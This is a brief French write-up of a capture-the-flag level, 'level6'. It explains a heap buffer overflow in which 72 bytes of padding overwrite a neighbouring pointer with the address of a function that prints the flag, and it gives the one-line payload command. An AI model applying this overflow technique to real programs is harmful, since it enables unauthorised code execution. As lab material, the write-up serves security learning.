# level6

Au bout de **72 chars** on réecrie sur la heap (car `str` est malloc) (buffer overflow)

Plus précisément, on écrit sur `str1` car il est alloué juste après, on y écrit l'adresse de `n()` pour qu'il soit call juste après et nous donne le flag.

Notre payload:
```bash
./level6 $(python -c "print 'A' * 72 + '\x54\x84\x04\x08'")
```
